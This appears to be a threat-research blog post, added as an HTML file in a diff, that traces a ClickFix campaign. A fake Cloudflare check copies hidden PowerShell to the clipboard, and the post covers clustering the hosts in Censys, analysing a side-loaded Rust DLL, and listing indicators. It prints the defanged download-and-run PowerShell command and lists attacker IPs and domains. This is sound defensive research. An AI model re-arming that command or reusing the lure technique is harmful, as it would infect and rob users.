@@ -1,0 +1,441 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>The Page That Talks You Into Infecting Yourself — Ghost in the Bit</title>
+  <meta name="description" content="Starting with no leads, I found a live ClickFix campaign on Censys: a fake Cloudflare verification page that copies hidden PowerShell to your clipboard and walks you through running it. Here is how I found it, clustered it, and pulled the payload apart." />
+  <link rel="icon" type="image/x-icon" href="/images/favicons/favicon.ico" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicons/favicon-16x16.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicons/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="192x192" href="/images/favicons/favicon-192x192.png" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicons/apple-touch-icon.png" />
+  <link rel="manifest" href="/site.webmanifest" />
+  <meta name="theme-color" content="#0a0a0a" />
+  <link rel="stylesheet" href="/platform/styles/core.css" />
+  <style>
+    /* Report-specific additions, built from core.css tokens so it stays native */
+    .article figure { margin: var(--space-6) 0; }
+    .article figure img {
+      width: 100%;
+      border: 1px solid var(--border-soft);
+      border-radius: var(--radius-3);
+      background: var(--bg-2);
+    }
+    .article figcaption {
+      margin-top: var(--space-2);
+      font-size: 0.82rem;
+      color: var(--text-3);
+      text-align: center;
+    }
+    .key-list { list-style: none; padding: 0; margin: var(--space-4) 0; }
+    .key-list li {
+      position: relative;
+      padding: 10px 0 10px 22px;
+      border-bottom: 1px solid var(--border-soft);
+      color: var(--text-1);
+    }
+    .key-list li::before {
+      content: "";
+      position: absolute; left: 0; top: 17px;
+      width: 8px; height: 8px;
+      background: var(--accent);
+      transform: rotate(45deg);
+    }
+    .callout-note {
+      background: var(--bg-2);
+      border-left: 3px solid var(--accent);
+      border-radius: 0 var(--radius-2) var(--radius-2) 0;
+      padding: var(--space-3) var(--space-5);
+      margin: var(--space-5) 0;
+      color: var(--text-1);
+      font-size: 0.95rem;
+    }
+    .callout-note strong { color: var(--text-0); }
+    .ioc-block {
+      background: var(--code-bg);
+      border: 1px solid var(--code-border);
+      border-radius: var(--radius-3);
+      padding: var(--space-4) var(--space-5);
+      margin: var(--space-5) 0;
+      font-size: 0.85rem;
+    }
+    .ioc-block h4 { margin: 0 0 var(--space-2); color: var(--text-1); font-size: 0.78rem; text-transform: uppercase; letter-spacing: 0.04em; }
+    .ioc-block + .ioc-block { margin-top: calc(var(--space-5) * -0.4); }
+    .warn-pill {
+      display: inline-block; font-size: 0.72rem; font-weight: 600;
+      letter-spacing: 0.04em; text-transform: uppercase;
+      color: #f0857c; background: rgba(192,57,43,0.14);
+      border: 1px solid rgba(192,57,43,0.4);
+      border-radius: 999px; padding: 2px 10px; margin-left: 6px;
+    }
+  </style>
+</head>
+<body>
+  <header class="site-header">
+    <a href="/" class="brand"><span class="brand-mark">◯</span><span class="brand-name">Ghost in the Bit</span></a>
+    <nav class="site-nav-inline" id="site-nav-inline"></nav>
+  </header>
+
+  <main class="article">
+    <header class="article-header">
+      <h1 class="article-title">The Page That Talks You Into Infecting Yourself</h1>
+      <div class="article-meta">
+        <span class="category-pill">research</span>
+        <time datetime="2026-06-08">June 8, 2026</time>
+        <span>Threat hunting</span>
+        <span>14 min read</span>
+      </div>
+    </header>
+
+    <div class="callout-note">
+      <strong>One note before we start.</strong> I am not a malware reverse engineer by trade and I am not going to pretend to be one. What I am decent at is the part that comes before the deep reversing, noticing something that does not add up, pulling the thread methodically, and refusing to overclaim. A couple of times below you will see me catch my own mistakes and correct them, and I left those in on purpose, because that is the actual job. I would rather be the person who says I am not sure, let me verify, than the one who confidently ships something wrong.
+    </div>
+
+    <p>
+      I went looking for trouble with no leads, just an idea of what attacker behavior looks like, and ended up on a live ClickFix operation. It is the scam where a fake verify you are human page quietly drops a malicious command onto your clipboard and then walks you through pasting it into the Windows Run box yourself. Classic, effective, and very much running right now.
+    </p>
+
+    <figure>
+      <img src="/blog/images/clickfix/00-flow-diagram.png" alt="Diagram of the ClickFix attack chain from lure page through clipboard hijack to DLL side-load and C2" />
+      <figcaption>The whole attack in one picture. The clean signed exe is the bait, the malicious DLL is the bite. Indicators defanged.</figcaption>
+    </figure>
+
+    <h2>The short version</h2>
+    <ul class="key-list">
+      <li>The whole thing lives on <strong>Cloudzy / RouterHosting (AS14956)</strong>, a host with a documented history of catering to malicious activity, spread across <strong>10 cloned hosts</strong> in two side by side <code>/24</code> ranges in Los Angeles. I found and mapped all of it with <strong>Censys</strong>.</li>
+      <li>The payload is something I initially misread, then corrected. It is a <strong>DLL search order hijack</strong> that uses a real, signed, clean Windows binary to side load a malicious <strong>UPX packed, Rust built DLL</strong>. That technique is not new, but I could not find any public writeup of this campaign using it on this infrastructure.</li>
+      <li>The malicious DLL reaches for <strong>13 high entropy domains</strong> that look algorithmically generated, for command and control. None of them resolve yet. The delivery side is wide open, the control side is deliberately dark until the operator flips it on.</li>
+      <li>Two honest gaps up front. I never nailed down which malware family this ultimately is, and I never caught it phoning home to a live server, because the domains it wants do not resolve. So I am not putting a family name on it or pretending I watched it beacon.</li>
+    </ul>
+
+    <h2>How I got here</h2>
+    <p>
+      I did not start with an IP, a domain, or a tip. I started with a question, what do attackers do that normal people do not? The trap I kept falling into early was hunting for tool names and open directories, which mostly surfaces honeypots and researchers and not real operators, so I changed the angle and instead of looking for tools I started looking for behavior that has no innocent explanation, and the cleanest example of that right now is ClickFix, because the lure page literally contains instructions telling a victim to open the Run dialog and paste a PowerShell command, and no legitimate website on earth tells you to do that.
+    </p>
+    <p>
+      So in Censys I searched for pages whose body contained both <code>powershell</code> and the <code>Win+R</code> instruction together. That combination basically cannot exist for a good reason, and it hit immediately.
+    </p>
+
+    <pre><code>host.services: (endpoints.http.body: "powershell" and endpoints.http.body: "Win+R")</code></pre>
+
+    <p>
+      The nested form there matters, it forces both strings onto the same service so you do not match a host that happens to mention each one on different ports.
+    </p>
+
+    <h2>What came back</h2>
+    <p>
+      A cluster of hosts, all looking the same. Same provider, RouterHosting / Cloudzy on AS14956 in Los Angeles. Same Censys labels flagging them for bulletproof style hosting and remote access. Same exact service layout, SSH on 22, a web server on 80 serving the lure, and a couple of Python services on 5000 and 5001 sitting quietly in the background.
+    </p>
+
+    <figure>
+      <img src="/blog/images/clickfix/05-behavior-cluster.png" alt="Censys search results showing 13 near-identical hosts on AS14956 matching the powershell and Win+R behavioral query" />
+      <figcaption>The behavioral query lands on a cluster of byte for byte identical hosts, all on RouterHosting / Cloudzy (AS14956) in Los Angeles. The matched fields show the Win+R instruction and the hidden PowerShell sitting right in the page body.</figcaption>
+    </figure>
+
+    <p>
+      When you see ten plus machines that are the same setup sitting next to each other in the same address space, that is not organic. That is someone spinning up infrastructure from a script or an image. The sameness is the signal.
+    </p>
+    <p>
+      Worth knowing who the landlord is, too. Cloudzy, which started life as RouterHosting before rebranding in 2021, is not a random budget host that happened to get abused. In 2023 the security firm Halcyon published research, <a href="https://www.halcyon.ai/" target="_blank" rel="noopener">first reported by Reuters</a>, characterizing it as a Command and Control Provider, a company that sells anonymous, crypto paid infrastructure to attackers while wearing the profile of a legitimate business, which Halcyon explicitly framed as distinct from classic bulletproof hosting. Halcyon estimated that between 40 and 60 percent of the servers Cloudzy hosted appeared tied to malicious activity, and linked it to a long list of state backed and ransomware groups. Two details from that report line up with what I found. AS14956, the autonomous system all ten of my hosts live on, is Cloudzy's own ASN, registered in May 2023, so this is not leased space I am guessing about, it is their own number. And the report's appendix lists a netblock at <code>172.86.120.0/22</code>, which sits right next to my identified <code>172.86.126</code> and <code>172.86.127</code> ranges, same operator, same neighborhood, though to be precise my exact identified blocks are not the ones enumerated in that 2023 appendix. Cloudzy disputed Halcyon's findings, so I will phrase the characterization as alleged rather than settled, but the point stands, a tightly cloned attack cluster living here is exactly what you would expect to find, not an anomaly.
+    </p>
+
+    <p>
+      The two quiet Python services are part of the fingerprint too. On every host, ports 5000 and 5001 run a Werkzeug development server that just returns 404s. Probably staging or a half built panel, but it is consistent enough across the cluster to be a useful tell.
+    </p>
+
+    <figure>
+      <img src="/blog/images/clickfix/07-python-services.png" alt="Censys service detail showing Python Werkzeug servers on ports 5000 and 5001 returning 404 Not Found" />
+      <figcaption>The same pair of Python Werkzeug services on 5000 and 5001, returning identical 404s, on each host in the cluster. Quiet, but consistent.</figcaption>
+    </figure>
+
+    <h2>Pulling the thread</h2>
+    <p>
+      I opened one of them in Censys and read the actual page. It was dressed up as a Cloudflare Verification check, verify your connection, click the button to copy your repair code. Friendly, harmless looking.
+    </p>
+
+    <figure>
+      <img src="/blog/images/clickfix/01-lure-page.png" alt="The fake Cloudflare Verification lure page as a victim would see it, served over plain HTTP from a raw IP" />
+      <figcaption>What the victim sees. A convincing fake verification page, served over plain HTTP straight from a raw IP, with a single friendly looking button.</figcaption>
+    </figure>
+
+    <p>
+      Click the button and it reveals the real instruction, <em>FINAL STEP: Press Win+R, then Ctrl+V and Enter.</em>
+    </p>
+
+    <figure>
+      <img src="/blog/images/clickfix/02-verify-button.png" alt="The lure page after the button is clicked, now showing the FINAL STEP press Win+R instruction in red" />
+      <figcaption>After the click. The button is gone and the real instruction appears, press Win+R, then Ctrl+V and Enter. Clicking it silently copied a command to your clipboard first.</figcaption>
+    </figure>
+
+    <p>
+      The clever and nasty part is in the page's JavaScript, because clicking Verify I am not a robot silently copies a command to your clipboard and then tells you to paste that into the Run box and hit enter, so you run it and not the page, which is the whole trick really, it sidesteps a lot of automated protection because the human is the one doing the dangerous part by hand.
+    </p>
+
+    <figure>
+      <img src="/blog/images/clickfix/04-page-source-js.png" alt="Page source showing the JavaScript that copies a hidden PowerShell download-and-run command to the clipboard" />
+      <figcaption>The page source. The click handler builds a hidden PowerShell string, drops it into a textarea, selects it, and fires <code>execCommand('copy')</code>. Then it reveals the Win+R instruction. The command is boxed in red.</figcaption>
+    </figure>
+
+    <p>
+      The command it copies is hidden PowerShell that makes a temp folder, pulls two files from another host in the same range, and runs one of them.
+    </p>
+
+    <figure>
+      <img src="/blog/images/clickfix/03-clipboard-decoded.png" alt="The decoded PowerShell payload pasted into a text editor, showing the download of two files from the payload host" />
+      <figcaption>The clipboard contents, placed into a text editor. It downloads <code>active_desktop_launcher.exe</code> and <code>active_desktop_render_x64.dll</code> from the payload host, then runs the launcher.</figcaption>
+    </figure>
+
+    <pre><code># Defanged. Do not run.
+powershell -w hidden -c "md $env:TEMP\upd -Force; cd $env:TEMP\upd;
+  iwr hxxp://172.86.126[.]195/active_desktop_launcher.exe -OutFile run.exe;
+  iwr hxxp://172.86.126[.]195/active_desktop_render_x64.dll -OutFile active_desktop_render_x64.dll;
+  .\run.exe"</code></pre>
+
+    <p>
+      That second host, the one actually serving the payload, is the piece I would not have seen from the UI if I had not read the page. It was hiding in plain sight inside the script.
+    </p>
+
+    <h2>Clustering it properly</h2>
+    <p>
+      Now that I had the payload's filename baked into that PowerShell, I pivoted on that in Censys, searching for every host referencing the same payload file. That tightened everything into a clean, bounded set, ten hosts across <code>172.86.126.x</code> and <code>172.86.127.x</code>, all pointing back to the same delivery box.
+    </p>
+
+    <pre><code>host.services.endpoints.http.body: "active_desktop_launcher.exe"</code></pre>
+
+    <figure>
+      <img src="/blog/images/clickfix/06-payload-pivot.png" alt="Censys results for the payload filename pivot, returning exactly 10 hosts all referencing the same payload host" />
+      <figcaption>Pivoting on the payload filename bounds the campaign to exactly 10 hosts, every one of them referencing the same delivery box at <code>172.86.126[.]195</code>. The first search found the lure pages, this one confirmed the edges.</figcaption>
+    </figure>
+
+    <p>
+      Two different angles landing on the same cluster is the kind of overlap that tells you you have actually mapped the thing, not just found a piece of it.
+    </p>
+
+    <h2>Taking the payload apart (and correcting my first read)</h2>
+    <p>
+      The PowerShell pulls two files, <code>active_desktop_launcher.exe</code> and <code>active_desktop_render_x64.dll</code>. My first instinct was that the two names were just serving the same single binary. That turned out to be wrong, and I want to leave the correction in rather than quietly fix it, because how you handle being wrong matters more than being right the first time.
+    </p>
+    <p>
+      They are two different files with two different fingerprints, and together they are a classic DLL search order hijack. The <code>active_desktop_launcher.exe</code> is a legitimate, signed, clean binary, a real KuGou Active Desktop component, a Chinese music app. On its own it scans clean, no threat, roughly 100 KiB. The <code>active_desktop_render_x64.dll</code> is the malicious payload, about 5 MiB, packed and built in Rust. When the clean launcher runs, Windows loads this DLL from the same folder by name, and that is where the bad code actually lives. The signed exe is bait, the DLL is the bite.
+    </p>
+
+    <figure>
+      <img src="/blog/images/clickfix/09-payload-card.png" alt="Summary card of the payload analysis showing malicious verdict, UPX and Rust indicators, forged metadata, and gibberish export table" />
+      <figcaption>The malicious half at a glance. Packed, Rust built, fake metadata, and an export table that is mostly noise.</figcaption>
+    </figure>
+
+    <p>Here is what the malicious DLL looks like once you start picking at it.</p>
+
+    <h3>Packing and build</h3>
+    <p>
+      The section table gives it away immediately. A zeroed <code>UPX0</code> next to a near maximal entropy <code>UPX1</code> is the classic UPX packed layout, and the entrypoint sitting inside <code>UPX1</code> confirms it.
+    </p>
+    <pre><code>Section   Entropy     Note
+UPX0      0.00        empty on disk, unpacked into at runtime
+UPX1      7.9996      packed code (entropy ~8.0 = compressed/encrypted)
+.rsrc     7.9715      high-entropy resources
+
+Entrypoint:       0x18018a5d0   (inside UPX1)
+Image base:       0x180000000   (high base)
+Characteristics:  HIGH_ENTROPY_VA, DYNAMIC_BASE, NX_COMPAT,
+                  DEBUG_STRIPPED, LINE_NUMS_STRIPPED, LOCAL_SYMS_STRIPPED</code></pre>
+    <p>
+      Underneath the packer it is a Rust binary, the strings carry Rust language artifacts and a Rust deflate/zlib compression library. The imports are deliberately thin on the surface, with the real capability resolved at runtime through <code>LoadLibrary</code> and <code>GetProcAddress</code>, which is normal for packed samples.
+    </p>
+
+    <h3>Forged version metadata</h3>
+    <p>
+      The version resource is fabricated, and sloppily. The company and product names are nonsense, and the copyright is dated to a year that had not happened yet when I pulled this.
+    </p>
+    <pre><code>CompanyName:      Lumin Mv cies pv Co
+ProductName:      koched
+InternalName:     koched
+OriginalFilename: koched
+FileDescription:  Unicode name dll for richedit 1.0. windows sockets helper dll.
+LegalCopyright:   (C) 2027 Lumin Mv cies pv Co. All rights reserved.
+FileVersion:      99.98.13.61</code></pre>
+    <p>
+      A 2027 copyright on a file analyzed in 2026, a garbled company name, and a Frankenstein richedit plus winsock helper description are all tells that the metadata exists only to look filled in at a glance.
+    </p>
+
+    <h3>The export table, which is my favorite part</h3>
+    <p>
+      The DLL exports 32 functions, but most of the names are random gibberish, salted with a handful of legitimate sounding decoys to pass a casual look. Every export also points at the same address except the real <code>DllRegisterServer</code>, which is the giveaway that the names are camouflage rather than distinct functions.
+    </p>
+    <pre><code>Ord  Export name                       Address
+#1   ApplyBspatch                      0x18000f430   <- decoy-ish
+#2   AsFWV6aGC9xQRZNDtMYoElAzO         0x18000f430   <- junk
+#3   CLzgsHlCxrKVQvZ0L9kGXyGr          0x18000f430   <- junk
+#4   ClearDesktopMonitorHook           0x18000f430   <- decoy
+#7   DllRegisterServer                 0x18000f470   <- real, distinct addr
+#10  GetMuteState                      0x18000f430   <- decoy
+#11  HostMainLoop                      0x18000f430   <- decoy
+#13  ModuleMain                        0x18000f430   <- decoy
+#16  PIp14MuHjOr5H0fN                  0x18000f430   <- junk
+#22  VH1HyTxahsoKLeF07xI8v48uM         0x18000f430   <- junk
+#29  rtF0jpQbn1YGo                     0x18000f430   <- junk
+...                                                  (32 exports total)</code></pre>
+    <p>
+      The decoy names, <code>HostMainLoop</code>, <code>ModuleMain</code>, <code>ClearDesktopMonitorHook</code>, <code>GetMuteState</code>, are clearly meant to echo the legitimate KuGou component this is impersonating, so a quick glance at the export list looks plausible. The intended execution is <code>rundll32</code> against the DLL's ordinals, not its names, which fits the side-load, the clean launcher calls into the malicious DLL by number.
+    </p>
+
+    <h3>What it is built to do</h3>
+    <p>
+      Pulled from the import table and the API strings recoverable from the binary. I am describing what it is built to do, not claiming I watched it do all of it.
+    </p>
+    <pre><code>Process / injection:   process enumeration, open/terminate process,
+                       create remote thread, queue APC into a remote
+                       process (a classic injection primitive)
+Token / privilege:     OpenProcessToken, NtOpenProcessToken,
+                       NtQueryInformationToken, NtSetInformationToken,
+                       access-token impersonation
+Environment / evasion: debugger checks (IsDebuggerPresent), VM-aware
+                       checks, WOW64 detection, system enumeration
+Credential / data:     API strings tied to credential theft and data
+                       exfiltration, username enumeration, file r/w
+Crypto / network:      Bcrypt + MS Enhanced Crypto Provider, WinHTTP,
+                       named-pipe create/connect, DNS queries</code></pre>
+
+    <h2>A reality check I am glad I did</h2>
+    <p>
+      Before getting excited about finding something, I went and checked whether this was already known, because the worst thing you can do in this space is announce a discovery that a vendor documented years ago.
+    </p>
+    <p>
+      Turns out the <code>active_desktop_launcher</code> plus <code>active_desktop_render</code> side loading pair is already documented, and I confirmed it against the primary source rather than taking a secondhand snippet's word for it. Symantec's Broadcom Threat Hunter Team wrote it up back in August 2021 in their report on LockFile ransomware. In their words, <code>active_desktop_launcher.exe</code> is a legitimate version of KuGou Active Desktop, and it is used in a DLL search order loading attack to load a malicious <code>active_desktop_render.dll</code>. So the technique and the specific file pair are not my discovery, and I am not going to dress them up as one.
+    </p>
+    <p>But I want to be precise about how much actually overlaps, because the technique being the same does not mean the whole thing is a rerun.</p>
+    <ul class="key-list">
+      <li><strong>What is the same.</strong> The side loading pair itself, the legitimate signed KuGou launcher abused to load a malicious render DLL by name. That is the documented part.</li>
+      <li><strong>What is different.</strong> In the 2021 LockFile case, the render DLL loaded and decrypted a local <code>desktop.ini</code> and ran shellcode from it, which Symantec assessed very likely fired a PetitPotam exploit to take over a domain controller. It was a hands on keyboard ransomware intrusion. In my case the same pair is delivered to a regular user through a ClickFix lure, and the render DLL is a UPX packed Rust binary with DGA based C2. No <code>desktop.ini</code>, no PetitPotam, no domain controller angle that I saw.</li>
+    </ul>
+    <p>
+      So the honest framing is an old, documented side loading technique repurposed as the payload stage of a ClickFix campaign, served from a Cloudzy cluster and carrying a payload with no public writeup I could find. The plumbing is borrowed and credited, the delivery, the payload, and the infrastructure are the original parts.
+    </p>
+
+    <h2>The C2 situation</h2>
+    <p>
+      The malicious DLL references 13 long, high entropy <code>.com</code> domains with the hallmarks of a DGA, a domain generation algorithm. The idea is that the malware can spin up huge numbers of these, and the operator only registers the handful they actually intend to use, often briefly, when they want to turn C2 on.
+    </p>
+    <p>
+      I checked all 13 against Censys in one shot. Zero hits. None of them resolve to anything, which is not a dead end so much as a finding, the control channel is not switched on yet, or it has already rotated past these. That is exactly how DGA C2 is supposed to behave, staying invisible until activation.
+    </p>
+
+    <figure>
+      <img src="/blog/images/clickfix/08-dga-no-results.png" alt="Censys query for the DGA domains returning no results, confirming none of them resolve" />
+      <figcaption>All 13 generated domains, checked at once. Your query returned no results. The delivery infrastructure is fully exposed and mappable, while the brain of the operation stays dark for now.</figcaption>
+    </figure>
+
+    <h2>Indicators</h2>
+
+    <div class="ioc-block">
+      <h4>Delivery hosts, all AS14956, Cloudzy / RouterHosting, Los Angeles</h4>
+      <pre><code>172.86.126[.]195   (payload host, also serves a lure)
+172.86.126[.]34
+172.86.126[.]86
+172.86.127[.]6
+172.86.127[.]23
+172.86.127[.]28
+172.86.127[.]29
+172.86.127[.]34
+172.86.127[.]43
+172.86.127[.]47</code></pre>
+    </div>
+
+    <div class="ioc-block">
+      <h4>Files (pulled from hxxp://172.86.126[.]195/)</h4>
+      <pre><code># Malicious DLL (the actual payload)         <span class="warn-pill">malicious</span>
+active_desktop_render_x64.dll
+SHA-256  4dd36fc6571a3b9344a2ebaca2c28cef218c2293d8e80923996b0ba61aa1bbc2
+~5 MiB · PE32+ DLL · x86-64 · UPX packed · Rust
+
+# Clean loader (legit signed KuGou binary, abused, NOT a threat on its own)
+active_desktop_launcher.exe
+SHA-256  f712c2a8b4abf2e299a2b480020333deb0f43364e9686cda78b1243c62e4830d
+~100 KiB · listed so defenders understand its role</code></pre>
+    </div>
+
+    <div class="ioc-block">
+      <h4>DGA C2 domains (not active right now, worth blocking)</h4>
+      <pre><code>1zawagpqmidxgykyugu2hlg37aomonfra3rwjawuyypapumwgl1sjefcduo4qf[.]com
+7kn3d97q05cibjxov8bhibxibye9dnlahcyf1qxm2ihwqs9vniufu[.]com
+bfnttwjvfnd71awnellzxyvk1obcjf9s[.]com
+bm9x7e0jrvpg3z0dmc0e8lv4fw908lw5b0f[.]com
+dlzyjvekwtcln1euv6exc0xg3lbhkmziii6hhiguzrglo[.]com
+ipsiujxntfidoqysiglifnuddsvi9xcflpsva0i[.]com
+k2mn2fpcbqkqbvyunuhex3hunqwjbkpk4bqqh5mvg[.]com
+movdggprm0c4d1xn2y9vb4lcggqtltorddr2mgbditbvqhpk[.]com
+redawcgavpebjm9crmugvc3hpia7jvwmetbfrlpevdxm4ouhael[.]com
+swccihjhixqerwl6b8sv3ztohc7ffno1zudahmrtvaofxjn75kh[.]com
+uptkrhoockg2ylx6frgksrp1hvpuyr7fsmkaybzco7slw[.]com
+yfi30ihrolqotssl1v0c2bmgya9imo4iyzkpwwm71apcfsnt7a[.]com
+zucbktig6czi2jtzsktvloqx9kxrsgkehzugulafhxg[.]com</code></pre>
+    </div>
+
+    <h2>Likely behavior (informed guessing, labeled as such)</h2>
+    <p>
+      This part is inference, not stuff I confirmed, and I am keeping that line bright. Based on what the malicious DLL is built to do, credential related APIs, system enumeration, code injection, DGA based C2, a Rust loader, and the broader pattern of ClickFix campaigns, it lines up with a loader or info stealer style payload. Get on the box, figure out where it is, phone home when the operator is ready, and likely pull down or enable a next stage. Publicly documented ClickFix campaigns have historically dropped things like Lumma Stealer, StealC, and NetSupport RAT, so that is the neighborhood this lives in. But I did not watch it steal anything or talk to a live server, so I am leaving it at this is what its capabilities point to, not this is what it does.
+    </p>
+
+    <h2>What to actually do about it</h2>
+    <p>
+      <strong>If you are a regular person reading this,</strong> the one rule that beats this entire attack is that no real website ever asks you to press Win+R and paste something to verify anything. If a page tells you to, it is an attack. Close it. If you already did it, get off the internet, do not type any passwords, get the machine looked at, and change your passwords from a different device.
+    </p>
+    <p><strong>If you are defending a network:</strong></p>
+    <ul class="key-list">
+      <li>Block the 10 IPs and the 13 domains. The IPs are the immediate threat, the domains are pre emptive since they are not live yet.</li>
+      <li>Treat the pairing as the signal. A signed, clean <code>active_desktop_launcher.exe</code> sitting next to an <code>active_desktop_render_x64.dll</code> in a user writable folder is the tell. The launcher being clean is exactly why this works, so do not let a clean verdict on the exe wave you off.</li>
+      <li>Hunt for the behavior, not just the indicators, because this campaign will rotate hosts. The chain that matters is something spawning hidden PowerShell right after clipboard activity, PowerShell pulling files from a raw IP into a temp folder, then a signed binary side loading a DLL by name out of that folder.</li>
+      <li>If you want to track the operator as they move, the infrastructure tell is the cloned setup itself, a ClickFix lure on port 80 plus those quiet Python services on 5000 and 5001, sitting on AS14956. You can watch for that template in Censys.</li>
+      <li>Report it. The hashes, URLs, and domains are all good to push to community threat intel feeds.</li>
+    </ul>
+
+    <h2>The honest wrap up</h2>
+    <p>
+      Start to finish, this went from I have literally nothing to a fully mapped delivery operation with the payload technique identified and an IOC list, by doing one simple thing, looking for behavior that cannot be innocent instead of looking for tools. The ClickFix <code>powershell</code> plus <code>Win+R</code> combo was the door, the cloned infrastructure was the confirmation, and reading the actual lure page handed me the payload host I would never have spotted from the outside. Censys carried the whole recon and clustering side of this from start to finish.
+    </p>
+    <p>
+      I will be straight about what I got wrong and what I do not know, because that is the part that actually builds trust. I misread the two files as one at first and corrected it. I checked whether the technique was already known instead of claiming a discovery, and it was, so I said so. And the two things I genuinely could not pin down, the exact malware family and a live C2, I am leaving as open questions rather than dressing them up, because the evidence does not support guessing.
+    </p>
+    <p>
+      I am not the most experienced person in this room and I know it, but what I would argue I bring is the temperament that makes the experience worth investing in, the curiosity that actually goes somewhere and the discipline to not overclaim and the habit of grading my own work honestly, so point me at the deeper reversing skills and I will close that gap, because the instinct for pulling a thread until it is fully unraveled and stopping exactly where the evidence stops is already here.
+    </p>
+
+    <div class="callout-note">
+      <strong>Sources.</strong> Prior documentation of the side loading technique: Symantec / Broadcom Threat Hunter Team, "LockFile: Ransomware Uses PetitPotam Exploit to Compromise Windows Domain Controllers," August 2021. On Cloudzy / RouterHosting (AS14956) as a Command and Control Provider: Halcyon Research Team, "Cloudzy with a Chance of Ransomware: Unmasking Command-and-Control Providers (C2Ps)," July 31, 2023. The 40 to 60 percent figure, the bulletproof versus C2P distinction, the AS14956 ownership, and the <code>172.86.120.0/22</code> netblock all appear in that report.
+    </div>
+
+    <div class="newsletter-cta inline">
+      <h2 class="newsletter-cta-heading">Liked this?</h2>
+      <p class="newsletter-cta-sub">
+        I write one of these a month. Drop your email below to get new posts
+        and research in your inbox. No spam.
+      </p>
+      <form
+        action="https://buttondown.com/api/emails/embed-subscribe/ghostinthebit"
+        method="post"
+        class="embeddable-buttondown-form"
+        target="popupwindow"
+      >
+        <label for="bd-email">Enter your email</label>
+        <input type="email" name="email" id="bd-email" placeholder="your@email.com" required />
+        <input type="submit" value="Subscribe" />
+        <p>
+          <a href="https://buttondown.com/refer/ghostinthebit" target="_blank" rel="noopener">
+            Powered by Buttondown.
+          </a>
+        </p>
+      </form>
+    </div>
+  </main>
+
+  <footer class="site-footer">
+    <p><span id="footer-year"></span> · Ghost in the Bit</p>
+  </footer>
+  <script type="module">
+    import { renderSiteNav } from "/platform/lib/site-nav.js";
+    renderSiteNav(document.getElementById("site-nav-inline"), "blog");
+    document.getElementById("footer-year").textContent = new Date().getFullYear();
+  </script>
+</body>
+</html>
